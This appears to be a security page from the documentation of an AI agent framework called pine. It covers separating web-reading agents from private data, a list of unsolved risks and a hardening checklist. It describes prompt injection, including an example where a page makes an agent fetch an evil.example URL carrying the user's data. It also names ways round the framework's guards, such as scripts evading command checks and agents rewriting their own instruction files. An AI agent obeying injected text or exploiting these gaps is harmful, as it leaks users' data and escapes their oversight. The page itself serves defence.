Delegation depth and loops, event hops, queue length, task and shell time limits, prompt size for
untrusted events and the rounds of a goal or a swarm are in [configuration.md](configuration.md).
Webhooks take 120 requests a minute each.

## A layout that keeps the pieces apart

The example home has one agent, `main`, with the web tools and your account: convenient, since
after it has read the web only sending out and critical actions ask. The dangerous combination
is one agent that has private data, reads outside content and can send things out. Once agents
hold private data, split those:

| Agent | Has | Does not have |
|---|---|---|
| `main` | Your conversation, your account, delegation to everyone | Web tools |
| `scout` | Web search and page reading, `safe` mode | Anything private: an empty workspace, no delegation (`"delegates": []`), no state |
| Specialists (`gonzo`, `house`) | Their repository, their own MCP servers | Web tools, network |
| `house` | Events from cameras and sensors (untrusted profile), writes `house/` state | A shell, the network |

`main` asks `scout` to research; the answer taints `main`'s conversation, so `main` then needs
your yes to send out or hand on a task. Scout can be fooled but has nothing to give away, as
long as it has `"delegates": []`: by default every agent can ask the others for their files.

## What is not solved

- **Leaks through an allowed channel.** An agent with private files and web access can be asked
  by a page to fetch `https://evil.example/?q=<your data>`: the tool working as meant. The layout
  above avoids it.
- **`auto` and `bypass` mode** work with your rights and no sandbox. pine's home is kept from the
  agent by reading its commands, which a script or a variable gets past. After outside content
  its shell can write instruction files and git hooks (a command that names a hook or a
  repository's configuration asks). For an agent that reads the web, `safe` mode is the wall.
- **Memory after outside content.** In `auto` and `bypass` an agent writes its own `MEMORY.md`,
  `AGENTS.md`, `SOUL.md` and `TOOLS.md` unchecked, and the main agent the files every agent reads.
  In `safe` mode you are asked first, but nothing checks what is written after a yes. The first
  paragraph of `AGENTS.md` is also what other agents read about it. Look into those files now and
  then; rules that must hold go into `agents/<id>/AGENTS.md`.
- **A model server reads what it is sent.** Whoever runs a server you add sees the conversations
  that use it; over plain `http` so does anyone on the path. Use `https` beyond your own network.
- **Worktrees without a sandbox** are kept apart only by where their tools start.
- **Bad answers and approval fatigue.** An injected page can make an agent tell you something
  false, and an approval shows the action, not whether its reasoning was honest. Approving
  without reading makes the questions worthless.
- **Bypass mode** acts with your rights, unasked. Use it for a task you watch, on an agent that
  does not read the web.
- **Your own MCP servers, extensions and source types** run unsandboxed. A server that can delete
  mail does so when an agent asks: mark it `"approve": "tainted"` or `"always"`.
- **Shell with network.** `sandbox.network: true` reaches the internet and your local network,
  an unauthenticated model server and anything on a port of this machine included; on Linux also
  socket files in temp (a tmux server, an ssh agent). Prefer the `web` server or a `commands`
  tool for the one thing that needs the network.
- **App control is outside the sandbox.** What an app can open, the agent can: a terminal or the
  Finder reaches pine's home, a mail app sends as you. Allow such apps only for a task you watch.
- **A signed-in browser.** With a persistent `profile`, or after you log in in a window the agent
  opened or in the Pine app's browser, the agent acts as you on that site ([mcp.md](mcp.md)).
- **The sandbox is the operating system's.** A kernel or sandbox bug is a way out. For stronger
  isolation run the daemon as a separate user with no access to your files.
- **Linux:** a new instruction file exists until the command that made it ends, and is looked for
  only six folders deep ("On Linux").
- **Local users.** Another account that can read pine's home has everything: keep it at mode 700.
- **Model quality.** A small quantised model follows hostile text more readily.

## Checklist

1. `pine check` shows "No security notes", or you know why each note is there.
2. Every webhook has a secret (`pine check` names hooks and `webhook` sources without one), and `pine check` names no source whose reports count as yours unless it should (a paired Telegram account is not listed).
3. `.env`, `pine.json`, `models.json` and `auth.json` are mode 600; the home is 700. `pine check` reports these.
4. No agent has `"trustWorkspace": true` or `"mode": "bypass"`, and every agent in `auto` mode is one you want to work with your whole account.
5. Web and browser tools are on an agent whose workspace holds nothing private and whose mode is `safe`; or you accept, for an agent in `auto`, that nothing looks at its shell after it read the web.
6. MCP servers that return other people's text have `"taints": true`; those that change things have `"approve": "tainted"`.
7. No route sets `"trust": "owner"` for a source others can write to.
8. `http.host` is `127.0.0.1`. Remote access goes through SSH or a tunnel.
9. You receive approval requests: give an agent `"approve": ["bash:*"]` once and ask it to run `ls` (not in bypass, where nothing asks).
